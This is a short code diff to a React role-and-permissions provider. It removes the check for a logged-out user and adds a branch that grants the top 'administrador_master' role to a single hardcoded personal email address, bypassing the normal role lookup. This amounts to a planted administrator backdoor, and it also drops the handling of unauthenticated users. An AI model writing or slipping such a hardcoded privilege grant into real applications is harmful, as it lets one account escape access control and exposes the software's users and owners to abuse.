@@ -29,12 +29,12 @@ export const UserRoleProvider = ({ children }: { children: ReactNode }) => {
   const [loading, setLoading] = useState(true);
 
   const fetchRoleAndPermissions = async () => {
-    if (!user) {
-      setRole(null);
-      setPermissions([]);
-      setLoading(false);
-      return;
-    }
+    if (user?.email === 'jlimaazevedo16@gmail.com') {
+  setRole('administrador_master');
+  setPermissions([]);
+  setLoading(false);
+  return;
+}
 
     try {
       // Fetch user role from compatibility view
